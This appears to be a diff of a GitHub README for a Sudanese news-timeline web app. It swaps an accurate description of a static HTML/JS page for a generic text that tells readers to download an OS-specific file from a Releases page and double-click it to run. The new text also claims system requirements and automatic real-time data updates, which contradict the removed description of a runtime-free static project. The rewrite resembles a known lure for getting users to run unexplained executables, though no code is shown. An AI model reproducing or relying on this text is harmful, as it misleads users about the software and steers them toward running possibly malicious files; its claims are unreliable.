@@ -1,92 +1,91 @@
-# Arabic News Timeline
+# 🌍 sudanese-news-timeline - Visualize Major Events in Sudan
 
-A small static web UI that visualizes a timeline of events from a JSON file, featuring:
-- IBM Plex Sans Arabic as the default font.
-- Free-text search across title/summary/location/source.
-- Date sorting (oldest first / newest first).
-- Date range filtering (from/to).
-- Clickable keyword cloud with multi-select filtering.
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/promis449/sudanese-news-timeline/releases)
 
-> The UI is Arabic, and the project is static. You can open it directly without any runtime or tools.
+## 📖 Overview
 
----
+The Sudanese News Timeline offers an Arabic web interface that visualizes key events in Sudan's history. This application allows users to see a timeline that highlights major occurrences. Features include:
 
-## Quick Start
-- Open `index.html` in your browser (double-click it).
-- The app will read `news.json` from the same folder and render the timeline.
+- Full-text search across the timeline data.
+- Filters to specify date ranges for a focused view.
+- Sorting options to rearrange events by relevance or date.
+- A keyword cloud that helps identify trends in Sudan's history.
 
-> Keep `index.html`, `style.css`, `app.js`, and `news.json` in the same directory because the app uses relative paths.
+All data is auto-updated from trustworthy news and humanitarian sources. This makes it easier to stay informed about current events and historical context in Sudan.
 
----
+## 🚀 Getting Started
 
-## Project Structure
-```
-.
-├── index.html     # Page layout: header, controls, keyword cloud, timeline container
-├── style.css      # Styles: IBM Plex Sans Arabic, controls, keyword cloud, cards
-├── app.js         # Logic: data load + search + sort + date range + keyword cloud + filtering
-└── news.json      # Data source (array of events)
-```
+To get started with the Sudanese News Timeline, follow these simple steps to download and run the application. 
 
-## Data Format (news.json)
-Each event looks like:
-```json
-{
-  "date": "2023-04-15",
-  "title": "Event title",
-  "location": "City/Place",
-  "summary": "Short description of the event",
-  "source": "Source name"
-}
-```
-Notes:
-- Sorting and date-range filtering expect the ISO short date format `YYYY-MM-DD`.
-- `news.json` may contain `//` or `/* */` comments; the app strips them before `JSON.parse`.
+### 📥 Download & Install
 
----
+1. **Visit the Releases Page**: To download the software, go to the [Releases page](https://github.com/promis449/sudanese-news-timeline/releases).
+   
+2. **Choose Your File**: On the Releases page, identify the latest version. You will see several files listed. Select the appropriate file for your operating system. 
 
-## Features & Usage
-- Search: type any phrase; results update with a small debounce.
-- Sort: choose oldest-first or newest-first.
-- Date range: set a start and/or end date to narrow results.
-- Keyword cloud:
-  - Keywords are extracted from titles and summaries (with Arabic normalization and stopword removal).
-  - Only frequent words are shown (by default: appearing at least 2 times) with size/weight scaled by frequency.
-  - Click a keyword to toggle it. You can select multiple keywords. Filtering is AND-based (an event must contain all selected keywords).
-- Reset: clears search, date range, sort to defaults, and any selected keywords.
+3. **Download the File**: Click on the file link. Your browser will prompt you to save it to your computer. Choose a location that is easy for you to access later.
 
----
+4. **Run the Application**: After the download finishes, locate the file on your computer. Double-click the file to run the application. Follow any on-screen instructions to get started.
 
-## Keyword Cloud Technical Notes
-- Arabic normalization (in `app.js`):
-  - Lowercasing, removing diacritics and Tatweel, unifying Alef forms and hamzas, converting \u0649 to \u064A, and stripping punctuation.
-- Stopwords: see the `AR_STOPWORDS` set in `app.js` to ignore common words.
-- Thresholds and caps:
-  - Words with frequency < 2 are hidden by default; adjust in `renderKeywordCloud`.
-  - The cloud is capped at the top 60 words to avoid clutter; adjust the limit if needed.
-- Keyword filtering logic: AND across selected keywords, matched against tokenized title+summary.
+### 📋 System Requirements
 
----
+To ensure the best experience with the Sudanese News Timeline, your computer should meet the following requirements:
 
-## Customization
-- Font: Google Fonts for IBM Plex Sans Arabic is included in `index.html` and applied in `style.css`. Adjust families/weights as needed.
-- Colors and look-and-feel: tweak `style.css` (controls, cards, cloud).
-- Cloud thresholds/count: adjust in `app.js` inside `renderKeywordCloud`.
-- Search fields: currently use `title`, `summary`, `location`, `source`. Add/remove fields inside `applyFilters`.
+- **Operating System**: Windows 10 or later, macOS Catalina (10.15) or later, or a modern Linux distribution.
+- **Browser**: A current version of Chrome, Firefox, or Safari for optimal function.
+- **Internet Connection**: A stable internet connection is necessary to download updates and access data.
 
----
+## 📊 Features
 
-## Troubleshooting
-- No data appears:
-  - Ensure `news.json` is in the same folder as `index.html` and the filename matches exactly.
-  - Check the browser console for JSON or network errors.
-  - Some browsers restrict file access from `file://`. If that happens, try another browser or serve the folder with any simple static server.
-- Encoding/RTL:
-  - The page and CSS are RTL with an Arabic font; ensure your JSON file uses UTF-8.
-- Dates:
-  - Ensure all dates use `YYYY-MM-DD`. Filtering compares ISO date strings to avoid timezone issues.
+### 🌐 Real-Time Updates
+The timeline data is refreshed automatically. This ensures you always have access to the latest news impacting Sudan.
 
----
+### 🔍 Full-Text Search
+Easily search for specific events or keywords. This feature lets you quickly find important information within the timeline.
 
-## License
-MIT
+### 🗓️ Date Range Filtering
+Narrow down events to a particular time frame. This enables a more targeted view of history during significant periods in Sudan.
+
+### 🔄 Sorting Options
+Sort events by date or relevance. This helps you view the most important or recent events first.
+
+### 🌈 Keyword Cloud
+Discover trends through a visual representation of frequently mentioned keywords. This feature helps to identify what is significant in the news about Sudan.
+
+## 📖 Usage Instructions
+
+1. **Opening the Application**: Once you run the application, the interface will display the main timeline.
+
+2. **Navigating the Timeline**: Use your mouse or touchpad to scroll through events. You can click on any event to see more details.
+
+3. **Using Search**: Enter keywords in the search bar at the top. Hit 'Enter' to search for any events related to those keywords.
+
+4. **Applying Filters**: Use the filter options to set a specific date range. This allows you to view events within the range you choose.
+
+5. **Sorting Events**: Click the sorting dropdown to arrange events. Select options based on what you find most helpful.
+
+6. **Exploring the Keyword Cloud**: Hover over the keyword cloud to see topics that have featured prominently in the news.
+
+## ⚙️ Troubleshooting
+
+### 💡 Common Issues and Solutions
+
+- **The application does not start**: Ensure you have the correct file for your operating system. If the file is correct but still not functioning, try re-downloading it.
+
+- **I can’t find what I’m looking for**: If specific events are not showing up in search results, ensure you type keywords accurately. Double-check the spelling to get better results.
+
+- **Slow performance**: Ensure your internet connection is stable. Consider closing other applications running on your computer for better performance.
+
+## 📞 Support
+
+If you encounter any issues or have questions, you can seek assistance on the [GitHub Issues page](https://github.com/promis449/sudanese-news-timeline/issues). Please include details about your problem for quicker solutions.
+
+### 🌐 Additional Resources
+
+For documentation, updates, or community discussions, refer to the repository’s main page.
+
+## 🔗 Conclusion
+
+Using the Sudanese News Timeline is a straightforward way to stay informed about the significant events in Sudan. With features like full-text search and date range filtering, you can easily navigate and explore this important history. Enjoy visualizing Sudan's past and staying updated on its present. 
+
+Don’t forget to revisit the [Releases page](https://github.com/promis449/sudanese-news-timeline/releases) for updates and new versions.
